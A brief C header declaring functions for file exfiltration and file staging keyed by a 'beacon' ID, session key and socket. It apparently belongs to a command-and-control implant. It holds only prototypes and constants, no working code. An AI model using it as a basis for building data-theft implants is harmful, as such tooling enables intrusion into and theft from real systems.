#ifndef TRANSFER_H
#define TRANSFER_H

#include <stdint.h>

#define EXFIL_CHUNK_SIZE 65536
#define MAX_STAGE_SLOTS  4

void handle_file_exfil(uint32_t beacon_id, uint32_t label,
                       const char *src_path,
                       const uint8_t session_key[32],
                       int session_sock);

void handle_file_stage(uint32_t beacon_id, uint32_t label,
                       uint32_t identifier, uint16_t flags,
                       const uint8_t *data, uint32_t len,
                       const uint8_t session_key[32],
                       int session_sock);

#endif
